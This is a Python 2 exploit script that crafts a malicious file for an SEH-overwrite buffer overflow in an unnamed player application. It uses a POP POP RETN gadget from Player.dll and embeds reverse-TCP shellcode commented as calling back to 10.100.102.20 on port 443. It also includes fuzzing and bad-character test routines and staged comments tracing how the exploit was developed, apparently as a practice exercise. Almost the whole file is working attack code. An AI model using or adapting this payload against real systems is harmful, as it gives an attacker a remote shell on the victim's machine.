#!/usr/bin/env python

import sys

def exploit():
    #megic seh formula exploit = junk + nseh + seh + nop + shelcode + padding
    junk = 260 * '\x41'
    nseh = "\xEB\x06\x90\x90" # jmp ten bytes, 2 for nop byte for seh adress it jump in nop area ..4--------20<- nop area 
    seh  = "\x47\x30\x01\x10" # POP r32 POP r32 RETN unprotected dll -> Player.dll POP POP RETN -> 10013047
    nop = 1000 * "\x90"
	# host 10.100.102.20 port 443 shell tcp reverse 
    shellcode = ("\x6a\x51\x59\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x9b\x64"
"\xf4\xe9\x83\xeb\xfc\xe2\xf4\x67\x8c\x76\xe9\x9b\x64\x94\x60"
"\x7e\x55\x34\x8d\x10\x34\xc4\x62\xc9\x68\x7f\xbb\x8f\xef\x86"
"\xc1\x94\xd3\xbe\xcf\xaa\x9b\x58\xd5\xfa\x18\xf6\xc5\xbb\xa5"
"\x3b\xe4\x9a\xa3\x16\x1b\xc9\x33\x7f\xbb\x8b\xef\xbe\xd5\x10"
"\x28\xe5\x91\x78\x2c\xf5\x38\xca\xef\xad\xc9\x9a\xb7\x7f\xa0"
"\x83\x87\xce\xa0\x10\x50\x7f\xe8\x4d\x55\x0b\x45\x5a\xab\xf9"
"\xe8\x5c\x5c\x14\x9c\x6d\x67\x89\x11\xa0\x19\xd0\x9c\x7f\x3c"
"\x7f\xb1\xbf\x65\x27\x8f\x10\x68\xbf\x62\xc3\x78\xf5\x3a\x10"
"\x60\x7f\xe8\x4b\xed\xb0\xcd\xbf\x3f\xaf\x88\xc2\x3e\xa5\x16"
"\x7b\x3b\xab\xb3\x10\x76\x1f\x64\xc6\x0c\xc7\xdb\x9b\x64\x9c"
"\x9e\xe8\x56\xab\xbd\xf3\x28\x83\xcf\x9c\x9b\x21\x51\x0b\x65"
"\xf4\xe9\xb2\xa0\xa0\xb9\xf3\x4d\x74\x82\x9b\x9b\x21\xb9\xcb"
"\x34\xa4\xa9\xcb\x24\xa4\x81\x71\x6b\x2b\x09\x64\xb1\x63\x83"
"\x9e\x0c\xfe\x8d\xfd\x70\x9c\xeb\x9b\x65\x4f\x60\x7d\x0e\xe4"
"\xbf\xcc\x0c\x6d\x4c\xef\x05\x0b\x3c\x1e\xa4\x80\xe5\x64\x2a"
"\xfc\x9c\x77\x0c\x04\x5c\x39\x32\x0b\x3c\xf3\x07\x99\x8d\x9b"
"\xed\x17\xbe\xcc\x33\xc5\x1f\xf1\x76\xad\xbf\x79\x99\x92\x2e"
"\xdf\x40\xc8\xe8\x9a\xe9\xb0\xcd\x8b\xa2\xf4\xad\xcf\x34\xa2"
"\xbf\xcd\x22\xa2\xa7\xcd\x32\xa7\xbf\xf3\x1d\x38\xd6\x1d\x9b"
"\x21\x60\x7b\x2a\xa2\xaf\x64\x54\x9c\xe1\x1c\x79\x94\x16\x4e"
"\xdf\x04\x5c\x39\x32\x9c\x4f\x0e\xd9\x69\x16\x4e\x58\xf2\x95"
"\x91\xe4\x0f\x09\xee\x61\x4f\xae\x88\x16\x9b\x83\x9b\x37\x0b"
"\x3c")
    padding = 200 * "\x43"     #351 sizeof of shellcode
    return junk + nseh + seh + nop + shellcode + padding

#does work because missing padding
def exploit_bad():
    #megic seh formula exploit = junk + nseh + seh + nop + shelcode + padding
    junk = 260 * '\x41'
    nseh = "\xEB\x0A\x90\x90" # jmp ten bytes, 2 for nop byte for seh adress it jump in nop area ..4--------20<- nop area 
    seh  = "\x47\x30\x01\x10" # POP r32 POP r32 RETN unprotected dll -> Player.dll POP POP RETN -> 10013047
    nop = 20 * "\x90"
	# host 10.100.102.20 port 443 shell tcp reverse 
    shellcode = ("\x6a\x51\x59\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x9b\x64"
"\xf4\xe9\x83\xeb\xfc\xe2\xf4\x67\x8c\x76\xe9\x9b\x64\x94\x60"
"\x7e\x55\x34\x8d\x10\x34\xc4\x62\xc9\x68\x7f\xbb\x8f\xef\x86"
"\xc1\x94\xd3\xbe\xcf\xaa\x9b\x58\xd5\xfa\x18\xf6\xc5\xbb\xa5"
"\x3b\xe4\x9a\xa3\x16\x1b\xc9\x33\x7f\xbb\x8b\xef\xbe\xd5\x10"
"\x28\xe5\x91\x78\x2c\xf5\x38\xca\xef\xad\xc9\x9a\xb7\x7f\xa0"
"\x83\x87\xce\xa0\x10\x50\x7f\xe8\x4d\x55\x0b\x45\x5a\xab\xf9"
"\xe8\x5c\x5c\x14\x9c\x6d\x67\x89\x11\xa0\x19\xd0\x9c\x7f\x3c"
"\x7f\xb1\xbf\x65\x27\x8f\x10\x68\xbf\x62\xc3\x78\xf5\x3a\x10"
"\x60\x7f\xe8\x4b\xed\xb0\xcd\xbf\x3f\xaf\x88\xc2\x3e\xa5\x16"
"\x7b\x3b\xab\xb3\x10\x76\x1f\x64\xc6\x0c\xc7\xdb\x9b\x64\x9c"
"\x9e\xe8\x56\xab\xbd\xf3\x28\x83\xcf\x9c\x9b\x21\x51\x0b\x65"
"\xf4\xe9\xb2\xa0\xa0\xb9\xf3\x4d\x74\x82\x9b\x9b\x21\xb9\xcb"
"\x34\xa4\xa9\xcb\x24\xa4\x81\x71\x6b\x2b\x09\x64\xb1\x63\x83"
"\x9e\x0c\xfe\x8d\xfd\x70\x9c\xeb\x9b\x65\x4f\x60\x7d\x0e\xe4"
"\xbf\xcc\x0c\x6d\x4c\xef\x05\x0b\x3c\x1e\xa4\x80\xe5\x64\x2a"
"\xfc\x9c\x77\x0c\x04\x5c\x39\x32\x0b\x3c\xf3\x07\x99\x8d\x9b"
"\xed\x17\xbe\xcc\x33\xc5\x1f\xf1\x76\xad\xbf\x79\x99\x92\x2e"
"\xdf\x40\xc8\xe8\x9a\xe9\xb0\xcd\x8b\xa2\xf4\xad\xcf\x34\xa2"
"\xbf\xcd\x22\xa2\xa7\xcd\x32\xa7\xbf\xf3\x1d\x38\xd6\x1d\x9b"
"\x21\x60\x7b\x2a\xa2\xaf\x64\x54\x9c\xe1\x1c\x79\x94\x16\x4e"
"\xdf\x04\x5c\x39\x32\x9c\x4f\x0e\xd9\x69\x16\x4e\x58\xf2\x95"
"\x91\xe4\x0f\x09\xee\x61\x4f\xae\x88\x16\x9b\x83\x9b\x37\x0b"
"\x3c")
    padding = (1000 - 28 - 351) * "\x43"     #351 sizeof of shellcode
    return junk + nseh + seh + nop + shellcode + padding

def bad_chars():
    #megic seh formula exploit = junk + nseh + seh + nop + shelcode + padding
    junk = 260 * '\x41'
    nseh = "\xEB\x0A\x90\x90" # jmp ten bytes, 2 for nop byte for seh adress it jump in nop area ..4--------20<- nop area 
    seh  = "\x47\x30\x01\x10" # POP r32 POP r32 RETN unprotected dll -> Player.dll POP POP RETN -> 10013047
    nop = 20 * "\x90"
    padding = (1000 - 28) * "\x43"    
    #badcahrs are  \x00 \x0a \x0d
    bad_chars = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")
    searching_pattern_in_memroy = 20 * "\x44" #refrence point
    return junk + nseh + seh + nop + padding + searching_pattern_in_memroy + bad_chars 
	#bad_chars = ("\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

def fuzz():
    return 1000 * '\x41'

def create_file(fileName, data):
    # write the exploit or bad chars string into file.
    print 'Creating.....'
    fd = open(fileName, 'a')
    fd.write(data)
    fd.close()
    print 'Done!'

#Stage 5
create_file(sys.argv[1], exploit())




#Stage 1 
#fuzz
#Stage 2
#Offset to NSeh and Seh
#Stage 3
#Searching pop r32 pop r32 retn in dll
#Stage 4
#Bad Chars 
#Stage 5
#Exploit 


    
